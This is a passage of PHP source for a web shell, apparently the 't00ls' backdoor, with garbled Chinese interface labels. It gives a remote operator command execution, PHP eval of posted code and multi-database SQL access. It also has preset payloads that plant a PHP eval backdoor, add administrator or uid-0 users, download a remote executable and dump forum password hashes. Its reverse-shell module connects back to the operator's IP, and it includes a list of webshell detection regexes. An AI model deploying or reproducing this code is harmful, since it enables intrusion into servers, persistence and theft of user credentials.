{padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("�½���",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = "��ѡ�ļ�"; $('act').value = a; } else { var msg = "Ŀ¼"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("ȷ��Ҫɾ��"+msg+"��")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php
echo VERSION;
?></title></head><body><div class="main"><div class="outl"><div class="toptag"><?php
echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - ��uid(' . getmyuid() . ') gid(' . getmygid() . ')��';
if (isset($issql))
    echo ' - ��' . $issql . '��';
?></div><?php
$menu   = array(
    'file' => '�ļ�����',
    'scan' => '�����ļ�',
    'antivirus' => 'ɨ�����',
    'exec' => 'ִ������',
    'phpeval' => 'ִ��PHP',
    'sql' => 'ִ��SQL',
    'backshell' => '����SHELL',
    'info' => 'ϵͳ��Ϣ'
);
$go     = array_key_exists($_POST['go'], $menu) ? $_POST['go'] : 'file';
$nowdir = isset($_POST['dir']) ? strdir(chop($_POST['dir']) . '/') : THISDIR;
echo '<div class="tag">';
foreach ($menu as $key => $name) {
    echo '<a' . ($go == $key ? ' class="current"' : '') . ' href="javascript:void(0);" onclick="go(\'' . $key . '\',\'' . base64_encode($nowdir) . '\');">' . $name . '</a> ';
}
echo '</div>';
echo '<form name="gofrm" id="gofrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="">';
echo '<input type="hidden" name="godir" id="godir" value="' . $nowdir . '">';
echo '<input type="hidden" name="govar" id="govar" value="">';
echo '</form>';
switch ($_POST['go']) {
    case "info":
        if (EXISTS_PHPINFO) {
            ob_start();
            phpinfo(INFO_GENERAL);
            $out = ob_get_contents();
            ob_end_clean();
            $tmp = array();
            preg_match_all('/\<td class\=\"e\"\>([Configure Command|Loaded Configuration File])+\s*\<\/td\>\<td class\=\"v\"\>(.*)\<\/td\>/i', $out, $tmp);
        }
        $infos = array(
            '����˵��' => '����POST�����Ϊ�˲���¼�����־.<br>��¼���뱣����ҳ����,��������COOKIE��SESSION.��¼��Ч��Ϊ��ǰҳ�����.<br>���𽫱�������Ϊ�Ƿ���;.',
            '�ͻ����������Ϣ' => $_SERVER['HTTP_USER_AGENT'],
            '�����õĺ���' => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : '(��)',
            '�����õ���' => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : '(��)',
            'PHP.ini����·��' => $tmp[2][1] ? $tmp[2][1] : '(��)',
            'PHP���з�ʽ' => php_sapi_name(),
            'PHP�汾' => PHP_VERSION,
            'PHP����PID' => getmypid(),
            '�ͻ���IP' => $_SERVER['REMOTE_ADDR'],
            '�ͻ������ֱ���' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
            'Web����˿�' => $_SERVER['SERVER_PORT'],
            'Web��Ŀ¼' => $_SERVER['DOCUMENT_ROOT'],
            'Webִ�нű�' => $_SERVER['SCRIPT_FILENAME'],
            'Web�淶CGI�汾' => $_SERVER['GATEWAY_INTERFACE'],
            'Web����ԱEmail' => $_SERVER['SERVER_ADMIN'] ? $_SERVER['SERVER_ADMIN'] : '(��)',
            '��ǰ�����ܴ�С' => size(disk_total_space('.')),
            '��ǰ���̿��ÿռ�' => size(disk_free_space('.')),
            'POST���������' => get_cfg_var("post_max_size"),
            '��������ϴ��ļ�' => get_cfg_var("upload_max_filesize"),
            '�������ʹ���ڴ���' => get_cfg_var("memory_limit"),
            '���������ʱ��' => get_cfg_var("max_execution_time") . '��',
            '�Ƿ�֧��Fsockopen' => function_exists('fsockopen') ? '��' : '��',
            '�Ƿ�֧��Socket' => function_exists('socket_close') ? '��' : '��',
            '�Ƿ�֧��Pcntl' => function_exists('pcntl_exec') ? '��' : '��',
            '�Ƿ�֧��Curl' => function_exists('curl_version') ? '��' : '��',
            '�Ƿ�֧��Zlib' => function_exists('gzclose') ? '��' : '��',
            '�Ƿ�֧��FTP' => function_exists('ftp_login') ? '��' : '��',
            '�Ƿ�֧��XML' => function_exists('xml_set_object') ? '��' : '��',
            '�Ƿ�֧��GD_Library' => function_exists('imageline') ? '��' : '��',
            '�Ƿ�֧��COM�齨' => class_exists('COM') ? '��' : '��',
            '�Ƿ�֧��ODBC�齨' => function_exists('odbc_close') ? '��' : '��',
            '�Ƿ�֧��IMAP�ʼ�' => function_exists('imap_close') ? '��' : '��',
            '�Ƿ������ڰ�ȫģʽ' => get_cfg_var("safemode") ? '��' : '��',
            '�Ƿ�����URL���ļ�' => get_cfg_var("allow_url_fopen") ? '��' : '��',
            '�Ƿ�����̬�������ӿ�' => get_cfg_var("enable_dl") ? '��' : '��',
            '�Ƿ���ʾ������Ϣ' => get_cfg_var("display_errors") ? '��' : '��',
            '�Ƿ��Զ�ע��ȫ�ֱ���' => get_cfg_var("register_globals") ? '��' : '��',
            '�Ƿ�ʹ�÷�б�������ַ���' => get_cfg_var("magic_quotes_gpc") ? '��' : '��',
            'PHP�������' => $tmp[2][0] ? $tmp[2][0] : '(��)'
        );
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<table class="tables"><tr><th style="width:26%;">����</th><th>����</th></tr>';
        foreach ($infos as $name => $var) {
            echo '<tr><td>' . $name . '</td><td>' . $var . '</td></tr>';
        }
        echo '</table>';
        break;
    case "exec":
        $cmd = $win ? 'dir' : 'ls -al';
        $res = array(
            'res' => '�������',
            'msg' => $msg
        );
        $str = isset($_POST['str']) ? $_POST['str'] : 'fun';
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            $cwd = $str == 'fun' ? THISDIR : 'com';
            $res = command($cmd, $cwd);
        }
        echo '<div class="msgbox">' . $res['msg'] . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="exec">';
        echo '<div class="actall">���� <input type="text" name="cmd" id="cmd" value="' . htmlspecialchars($cmd) . '" style="width:398px;"> ';
        echo '<select name="str">';
        $selects = array(
            'fun' => 'phpfun',
            'com' => 'wscript'
        );
        foreach ($selects as $var => $name) {
            echo '<option value="' . $var . '"' . ($var == $str ? ' selected' : '') . '>' . $name . '</option>';
        }
        echo '</select> ';
        echo '<select onchange="$(\'cmd\').value=options[selectedIndex].value">';
        echo '<option>---�����---</option>';
        echo '<option value="echo ' . htmlspecialchars('"<?php phpinfo();?>"') . ' >> ' . THISDIR . 't00ls.txt">д�ļ�</option>';
        echo '<option value="whoami">����˭</option>';
        echo '<option value="net user t00ls t00ls /add">Win-����û�</option>';
        echo '<option value="net localgroup administrators t00ls /add">Win-���û���</option>';
        echo '<option value="netstat -an">Win-�鿴�˿�</option>';
        echo '<option value="ipconfig /all">Win-�鿴��ַ</option>';
        echo '<option value="net start">Win-�鿴����</option>';
        echo '<option value="tasklist">Win-�鿴����</option>';
        echo '<option value="id;uname -a;cat /etc/issue;cat /proc/version;lsb_release -a">Linux-�汾����</option>';
        echo '<option value="/usr/sbin/useradd -u 0 -o -g 0 t00ls">Linux-����û�</option>';
        echo '<option value="cat /etc/passwd">Linux-�鿴�û�</option>';
        echo '<option value="/bin/netstat -tnl">Linux-�鿴�˿�</option>';
        echo '<option value="/sbin/ifconfig -a">Linux-�鿴��ַ</option>';
        echo '<option value="/sbin/chkconfig --list">Linux-�鿴����</option>';
        echo '<option value="/bin/ps -ef">Linux-�鿴����</option>';
        echo '</select> ';
        echo '<input type="submit" style="width:50px;" value="ִ��">';
        echo '</div><div class="actall"><textarea style="width:698px;height:368px;">' . htmlspecialchars($res['res']) . '</textarea></div></form>';
        break;
    case "scan":
        $scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
        $keyword = isset($_POST['keyword']) ? $_POST['keyword'] : '';
        $include = isset($_POST['include']) ? chop($_POST['include']) : '.php|.asp|.asa|.cer|.aspx|.jsp|.cgi|.sh|.pl|.py';
        $filters = isset($_POST['filters']) ? chop($_POST['filters']) : 'html|css|img|images|image|style|js';
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="scan">';
        echo '<table class="tables"><tr><th style="width:15%;">����</th><th>����</th></tr>';
        echo '<tr><td>����·��</td><td><input type="text" name="dir" value="' . htmlspecialchars($scandir) . '" style="width:500px;"></td></tr>';
        echo '<tr><td>��������</td><td><input type="text" name="keyword" value="' . htmlspecialchars($keyword) . '" style="width:500px;"> (�ļ������ļ�����)</td></tr>';
        echo '<tr><td>�ļ���׺</td><td><input type="text" name="include" value="' . htmlspecialchars($include) . '" style="width:500px;"> (��"|"�ָ�, Ϊ�������������ļ�)</td></tr>';
        echo '<tr><td>����Ŀ¼</td><td><input type="text" name="filters" value="' . htmlspecialchars($filters) . '" style="width:500px;"> (��"|"�ָ�, Ϊ���򲻹���Ŀ¼)</td></tr>';
        echo '<tr><td>������ʽ</td><td><label><input type="radio" name="type" value="0"' . ($_POST['type'] ? '' : ' checked') . '>�����ļ���</label> ';
        echo '<label><input type="radio" name="type" value="1"' . ($_POST['type'] ? ' checked' : '') . '>������������</label> ';
        echo '<label><input type="checkbox" name="char" value="1"' . ($_POST['char'] ? ' checked' : '') . '>ƥ���Сд</label></td></tr>';
        echo '<tr><td>������Χ</td><td><label><input type="radio" name="range" value="0"' . ($_POST['range'] ? '' : ' checked') . '>������Ӧ���ڸ��ļ���,���ļ��к��ļ�</label> ';
        echo '<label><input type="radio" name="range" value="1"' . ($_POST['range'] ? ' checked' : '') . '>��������Ӧ���ڸ��ļ���</label></td></tr>';
        echo '<tr><td>����</td><td><input type="submit" style="width:80px;" value="����"></td></tr>';
        echo '</table></form>';
        if ($keyword != '') {
            flush();
            ob_flush();
            echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
            $incs = $include == '' ? false : explode('|', $include);
            $fits = $filters == '' ? false : explode('|', $filters);
            scanfile(strdir($scandir . '/'), $keyword, $incs, $fits, $_POST['type'], $_POST['char'], $_POST['range'], $nowdir);
            echo '�������</div>';
        }
        break;
    case "antivirus":
        $scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
        $typearr = isset($_POST['dir']) ? $_POST['types'] : array(
            'php' => '.php'
        );
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="antivirus">';
        echo '<table class="tables"><tr><th style="width:15%;">����</th><th>����</th></tr>';
        echo '<tr><td>ɨ��·��</td><td><input type="text" name="dir" value="' . htmlspecialchars($scandir) . '" style="width:500px;"></td></tr>';
        echo '<tr><td>��ɱ����</td><td>';
        $types = array(
            'php' => '.php',
            'asp+aspx' => '.as|.cs|.cer',
            'jsp' => '.jsp'
        );
        foreach ($types as $key => $ex)
            echo '<label title="' . $ex . '"><input type="checkbox" name="types[' . $key . ']" value="' . $ex . '"' . ($typearr[$key] == $ex ? ' checked' : '') . '>' . $key . '</label> ';
        echo '</td></tr><tr><td>����</td><td><input type="submit" style="width:80px;" value="ɨ��"></td></tr>';
        echo '</table></form>';
        if (count($_POST['types']) > 0) {
            $matches = array(
                'php' => array(
                    '/function\_exists\s*\(\s*[\'|\"](popen|exec|proc\_open|system|passthru)+[\'|\"]\s*\)/i',
                    '/(exec|shell\_exec|system|passthru)+\s*\(\s*\$\_(GET|POST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i',
                    '/(udp\:\/\/(.*)\;)+/i',
                    '/preg\_replace\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\)/i',
                    '/preg\_replace\s*\((.*)\(base64\_decode\(\$/i',
                    '/(eval|assert|include|require)+\s*\((.*)(base64\_decode|file\_get\_contents|php\:\/\/input)+/i',
                    '/(eval|assert|include|require|array\_map)+\s*\(\s*\$\_(GET|POST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i',
                    '/\$\_(GET|POST|COOKIE|SERVER|SESSION)+(.*)(eval|assert|include|require)+\s*\(\s*\$(\w+)\s*\)/i',
                    '/\$\_(GET|POST|COOKIE|SERVER|SESSION)+\[(.*)\]\(\s*\$(.*)\)/i',
                    '/\(\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\)/i',
                    '/(fopen|fwrite|fpust|file\_put\_contents)+\s*\((.*)\$\_(GET|POST|COOKIE|SERVER|SESSION)+\[(.*)\](.*)\)/i',
                    '/echo\s*curl\_exec\s*\(\s*\$(\w+)\s*\)/i',
                    '/new com\s*\(\s*[\'|\"]shell(.*)[\'|\"]\s*\)/i',
                    '/\$(.*)\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\)/i',
                    '/\$\_\=(.*)\$\_/i'
                ),
                'asp+aspx' => array(
                    '/(VBScript\.Encode|WScript\.shell|Shell\.Application|Scripting\.FileSystemObject)+/i',
                    '/(eval|execute)+(.*)(request|session)+\s*\((.*)\)/i',
                    '/(eval|execute)+(.*)request.item\s*\[(.*)\]/i',
                    '/request\s*\((.*)\)(.*)(eval|execute)+\s*\((.*)\)/i',
                    '/\<script\s*runat\s*\=(.*)server(.*)\>(.*)\<\/script\>/i',
                    '/Load\s*\((.*)Request/i',
                    '/StreamWriter\(Server\.MapPath(.*)\.Write\(Request/i'
                ),
                'jsp' => array(
                    '/(eval|execute)+(.*)(request|session)+\s*\((.*)\)/i',
                    '/(eval|execute)+(.*)request.item\s*\[(.*)\]/i',
                    '/request\s*\((.*)\)(.*)(eval|execute)+\s*\((.*)\)/i',
                    '/Runtime\.getRuntime\(\)\.exec\((.*)\)/i',
                    '/FileOutputStream\(application\.getRealPath(.*)request/i'
                )
            );
            flush();
            ob_flush();
            echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
            antivirus(strdir($scandir . '/'), $typearr, $matches, $nowdir);
            echo 'ɨ�����</div>';
        }
        break;
    case "phpeval":
        if (isset($_POST['phpcode'])) {
            $phpcode = chop($_POST['phpcode']);
            ob_start();
            if (substr($phpcode, 0, 2) == '<?' && substr($phpcode, -2) == '?>') {
                @eval('?>' . $phpcode . '<?php ');
            } else {
                @eval($phpcode);
            }
            $out = ob_get_contents();
            ob_end_clean();
        } else {
            $phpcode = 'phpinfo();';
            $out     = '���Դ���';
        }
        echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmZ1bmN0aW9uIHJ1bmNvZGUob2JqbmFtZSkge3ZhciB3aW5uYW1lID0gd2luZG93Lm9wZW4oJycsIl9ibGFuayIsJycpO3ZhciBvYmogPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChvYmpuYW1lKTt3aW5uYW1lLmRvY3VtZW50Lm9wZW4oJ3RleHQvaHRtbCcsJ3JlcGxhY2UnKTt3aW5uYW1lLm9wZW5lciA9IG51bGw7d2lubmFtZS5kb2N1bWVudC53cml0ZShvYmoudmFsdWUpO3dpbm5hbWUuZG9jdW1lbnQuY2xvc2UoKTt9PC9zY3JpcHQ+');
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="phpeval">';
        echo '<div class="actall"><p><textarea name="phpcode" id="phpcode" style="width:698px;height:180px;">' . htmlspecialchars($phpcode) . '</textarea></p><p>';
        echo '<select onchange="$(\'phpcode\').value=options[selectedIndex].value">';
        echo '<option>---�������---</option>';
        echo '<option value="echo readfile(\'C:/web/t00ls.php\');">��ȡ�ļ�</option>';
        echo '<option value="$fp=fopen(\'C:/web/t00ls.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">д���ļ�</option>';
        echo '<option value="echo copy(\'C:/web/t00ls1.php\',\'C:/web/t00ls2.php\')?\'Success!\':\'Fail!\';">�����ļ�</option>';
        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'http://www.baidu.com/cmd.exe\'))?\'Success!\':\'Fail!\';">Զ������</option>';
        echo '<option value="print_r($_SERVER);">��������</option>';
        echo '</select> ';
        echo '<input type="submit" style="width:80px;" value="ִ��"></p></div>';
        echo '</form><div class="actall"><p><textarea id="evalcode" style="width:698px;height:180px;">' . htmlspecialchars($out) . '</textarea></p><p><input type="button" value="��HTML�������ϴ���" onclick="runcode(\'evalcode\')"></p></div>';
        break;
    case "sql":
        if ((!empty($_POST['sqlhost'])) && (!empty($_POST['sqluser'])) && (!empty($_POST['names']))) {
            $type    = $_POST['type'];
            $sqlhost = $_POST['sqlhost'];
            $sqluser = $_POST['sqluser'];
            $sqlpass = $_POST['sqlpass'];
            $sqlname = $_POST['sqlname'];
            $sqlcode = $_POST['sqlcode'];
            $names   = $_POST['names'];
            switch ($type) {
                case "PostgreSql":
                    if (function_exists('pg_close')) {
                        if (strstr($sqlhost, ':')) {
                            $array   = explode(':', $sqlhost);
                            $sqlhost = $array[0];
                            $sqlport = $array[1];
                        } else {
                            $sqlport = 5432;
                        }
                        $dbconn = @pg_connect("host=$sqlhost port=$sqlport dbname=$sqlname user=$sqluser password=$sqlpass");
                        if ($dbconn) {
                            $msg = '<h2>����' . $type . '�ɹ� </h2>';
                            pg_query('set client_encoding=' . $names);
                            $result = pg_query($sqlcode);
                            if ($result) {
                                $msg .= '<h2> - ִ��SQL�ɹ�</h2>';
                                while ($array = pg_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - ִ��SQLʧ��</h1>';
                                $rows = array(
                                    'error' => pg_result_error($result)
                                );
                            }
                            pg_free_result($result);
                        } else {
                            $msg = '<h1>����' . $type . 'ʧ��</h1>';
                        }
                        @pg_close($dbconn);
                    } else {
                        $msg = '<h1>��֧��' . $type . '</h1>';
                    }
                    break;
                case "MsSql":
                    if (function_exists('mssql_close')) {
                        $dbconn = @mssql_connect($sqlhost, $sqluser, $sqlpass);
                        if ($dbconn) {
                            $msg = '<h2>����' . $type . '�ɹ� </h2>';
                            mssql_select_db($sqlname, $dbconn);
                            $result = mssql_query($sqlcode);
                            if ($result) {
                                $msg .= '<h2> - ִ��SQL�ɹ�</h2>';
                                while ($array = mssql_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - ִ��SQLʧ��</h1>';
                            }
                            @mssql_free_result($result);
                        } else {
                            $msg = '<h1>����' . $type . 'ʧ��</h1>';
                        }
                        @mssql_close($dbconn);
                    } else {
                        $msg = '<h1>��֧��' . $type . '</h1>';
                    }
                    break;
                case "Oracle":
                    if (function_exists('oci_close')) {
                        $conn = @oci_connect($sqluser, $sqlpass, $sqlhost . '/' . $sqlname);
                        if ($conn) {
                            $msg  = '<h2>����' . $type . '�ɹ� </h2>';
                            $stid = oci_parse($conn, $sqlcode);
                            oci_execute($stid);
                            if ($stid) {
                                $msg .= '<h2> - ִ��SQL�ɹ�</h2>';
                                while (($array = oci_fetch_array($stid, OCI_ASSOC))) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= '<h1> - ִ��SQLʧ��</h1>';
                                $e    = oci_error();
                                $rows = array(
                                    'error' => $e['message']
                                );
                            }
                            oci_free_statement($stid);
                        } else {
                            $e    = oci_error();
                            $rows = array(
                                'error' => $e['message']
                            );
                            $msg  = '<h1>����' . $type . 'ʧ��</h1>';
                        }
                        @oci_close($conn);
                    } else {
                        $msg = '<h1>��֧��' . $type . '</h1>';
                    }
                    break;
                case "MySql":
                    if (function_exists('mysql_close')) {
                        $conn = mysql_connect(strstr($sqlhost, ':') ? $sqlhost : $sqlhost . ':3306', $sqluser, $sqlpass, $sqlname);
                        if ($conn) {
                            $msg = '<h2>����' . $type . '�ɹ� </h2>';
                            if (substr($sqlcode, 0, 7) == 't00lsa') {
                                $array = array();
                                $data  = '';
                                $i     = 0;
                                preg_match_all('/t00lsa\s*\'(.*)\'\s*t00lsb\s*\'(.*)\'\s*t00lsc\s*\'(.*)\'\s*t00lsfile\s*\'(.*)\'/i', $sqlcode, $array);
                                if ($array[1][0] && $array[2][0] && $array[3][0] && $array[4][0]) {
                                    mysql_select_db($array[1][0], $conn);
                                    mysql_query('set names ' . $names, $conn);
                                    $spidercode = 'select ' . $array[3][0] . ' from `' . $array[2][0] . '`;';
                                    $result     = mysql_query($spidercode, $conn);
                                    if ($result) {
                                        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                            $data .= join(' |x| ', $row) . "\r\n";
                                            $i++;
                                        }
                                        if ($data) {
                                            $file = strdir($array[4][0]);
                                            $msg .= filew($file, $data, 'w') ? '<h2> - �ѿ�ɹ�</h2>' : '<h1> - �����ļ�ʧ��</h1>';
                                            $rows = array(
                                                'file' => $file,
                                                size(filesize($file)) => '����ȡ' . $i . '������'
                                            );
                                        } else {
                                            $msg .= '<h1> - û������</h1>';
                                        }
                                    } else {
                                        $msg .= '<h1> - ִ��SQLʧ��</h1>';
                                        $rows = array(
                                            'errno' => mysql_errno(),
                                            'error' => mysql_error()
                                        );
                                    }
                                } else {
                                    $msg .= '<h1> - �ѿ�������</h1>';
                                }
                            } elseif (!empty($sqlcode)) {
                                mysql_select_db($sqlname, $conn);
                                mysql_query('set names ' . $names, $conn);
                                $result = mysql_query($sqlcode, $conn);
                                if ($result) {
                                    $msg .= '<h2> - ִ��SQL�ɹ�</h2>';
                                    while ($array = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                        $rows[] = $array;
                                    }
                                } else {
                                    $msg .= '<h1> - ִ��SQLʧ��</h1>';
                                    $rows = array(
                                        'errno' => mysql_errno(),
                                        'error' => mysql_error()
                                    );
                                }
                            }
                            mysql_free_result($result);
                        } else {
                            $msg  = '<h1>����' . $type . 'ʧ��</h1>';
                            $rows = array(
                                'errno' => mysql_errno(),
                                'error' => mysql_error()
                            );
                        }
                        mysql_close($conn);
                    } else {
                        $msg = '<h1>��֧��' . $type . '</h1>';
                    }
                    break;
            }
        } else {
            $type    = 'MySql';
            $sqlhost = 'localhost:3306';
            $sqluser = 'root';
            $sqlpass = '123456';
            $sqlname = 'mysql';
            $sqlcode = 'select version();';
            $names   = 'gbk';
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="sql">';
        echo '<table class="tables"><tr><th style="width:15%;">����</th><th>����</th></tr>';
        echo '<tr><td>֧������</td><td>';
        $dbs = array(
            'MySql',
            'MsSql',
            'Oracle',
            'PostgreSql'
        );
        foreach ($dbs as $dbname) {
            echo '<label><input type="radio" name="type" value="' . $dbname . '"' . ($type == $dbname ? ' checked' : '') . '>' . $dbname . '</label> ';
        }
        echo '</td></tr><tr><td>����</td><td>��ַ <input type="text" name="sqlhost" style="width:188px;" value="' . $sqlhost . '"> ';
        echo '�û� <input type="text" name="sqluser" style="width:108px;" value="' . $sqluser . '"> ';
        echo '���� <input type="text" name="sqlpass" style="width:108px;" value="' . $sqlpass . '"> ';
        echo '���� <input type="text" name="sqlname" style="width:108px;" value="' . $sqlname . '"></td></tr>';
        echo '<tr><td>���<br>';
        echo '<select onchange="$(\'sqlcode\').value=options[selectedIndex].value">';
        echo '<option value="select version();">---��伯��---</option>';
        echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">д���ļ�</option>';
        echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \'' . $sqluser . '\'@\'%\' IDENTIFIED BY \'' . $sqlpass . '\' WITH GRANT OPTION;">��������</option>';
        echo '<option value="show variables;">ϵͳ����</option>';
        echo '<option value="create database t00ls;">�������ݿ�</option>';
        echo '<option value="create table `t00ls` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">�������ݱ�</option>';
        echo '<option value="show databases;">��ʾ���ݿ�</option>';
        echo '<option value="show tables from `' . $sqlname . '`;">��ʾ���ݱ�</option>';
        echo '<option value="show columns from `t00ls`;">��ʾ��ṹ</option>';
        echo '<option value="drop table `t00ls`;">ɾ�����ݱ�</option>';
        echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">��ʾ�ֶ�</option>';
        echo '<option value="insert into `admin` (`user`,`pass`) values (\'t00ls\', \'f1a81d782dea6a19bdca383bffe68452\');">��������</option>';
        echo '<option value="update `admin` set `user` = \'t00ls1\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'t00ls\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">�޸�����</option>';
        echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \'' . THISDIR . 'out.txt\';">�ѿ�(MySql)</option>';
        echo '</select>';
        echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">' . htmlspecialchars($sqlcode) . '</textarea></td></tr>';
        echo '<tr><td>����</td><td><select name="names">';
        $charsets = array(
            'gbk',
            'utf8',
            'big5',
            'latin1',
            'cp866',
            'ujis',
            'euckr',
            'koi8r',
            'koi8u'
        );
        foreach ($charsets as $charset) {
            echo '<option value="' . $charset . '"' . ($names == $charset ? ' selected' : '') . '>' . $charset . '</option>';
        }
        echo '</select> <input type="submit" style="width:80px;" value="ִ��"></td></tr>';
        echo '</table></form>';
        if ($rows) {
            echo '<pre style="padding:5px;background:#F8F8F8;text-align:left;">';
            ob_start();
            print_r($rows);
            $out = ob_get_contents();
            ob_end_clean();
            if (preg_match('~[\x{4e00}-\x{9fa5}]+~u', $out) && function_exists('iconv')) {
                $out = @iconv('UTF-8', 'GB2312//IGNORE', $out);
            }
            echo htmlspecialchars($out);
            echo '</pre>';
        }
        break;
    case "backshell":
        if ((!empty($_POST['backip'])) && (!empty($_POST['backport']))) {
            $backip   = $_POST['backip'];
            $backport = $_POST['backport'];
            $temp     = $_POST['temp'] ? $_POST['temp'] : '/tmp';
            $type     = $_POST['type'];
            $msg      = backshell($backip, $backport, $temp, $type);
        } else {
            $backip   = $_SERVER['REMOTE_ADDR'];
            $backport = '443';
            $temp     = '/tmp';
            $type     = 'pl';
            $msg      = 'PHP�����ɼ���Linux��Windows ���෽��ֻ����Linux';
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="backshell">';
        echo '<table class="tables"><tr><th style="width:15%;">����</th><th>����</th></tr>';
        echo '<tr><td>������ַ</td><td><input type="text" name="backip" style="width:268px;" value="' . $backip . '"> (Your ip)</td></tr>';
        echo '<tr><td>�����˿�</td><td><input type="text" name="backport" style="width:268px;" value="' . $backport . '"> (nc -vvlp ' . $backport . ')</td></tr>';
        echo '<tr><td>��ʱĿ¼</td><td><input type="text" name="temp" style="width:268px;" value="' . $temp . '"> (Only Linux)</td></tr>';
        echo '<tr><td>��������</td><td>';
        $types = array(
            'pl' => 'Perl',
            'py' => 'Python',
            'c' => 'C-bin',
            'pcntl' => 'Pcntl',
            'php' => 'PHP',
            'phpwin' => 'PHP-COM'
        );
        foreach ($types as $key => $name) {
            echo '<label><input type="radio" name="type" value="' . $key . '"' . ($key == $type ? ' checked' : '') . '>' . $name . '</label> ';
        }
        echo '</td></tr><tr><td>����</td><td><input type="submit" style="width:80px;" value="����"></td></tr>';
        echo '</table></form>';
        break;
    case "edit":
    case "editor":
        $file  = strdir($_POST['godir'] . '/' . $_POST['govar']);
        $iconv = function_exists('iconv');
        if (!file_exists($file)) {
            $msg = '���½��ļ���';
        } else {
            $code = filer($file);
            $chst = 'Ĭ��';
            if (preg_match('~[\x{4e00}-\x{9fa5}]+~u', $code) && $iconv) {
                $chst = 'utf-8';
                $code = @iconv('UTF-8', 'GB2312//IGNORE', $code);
            }
            $size = size(filesize($file));
            $msg  = '���ļ����� ' . substr(decoct(fileperms($file)), -4) . '�� ���ļ���С ' . $size . '�� ���ļ����� ' . $chst . '��';
        }
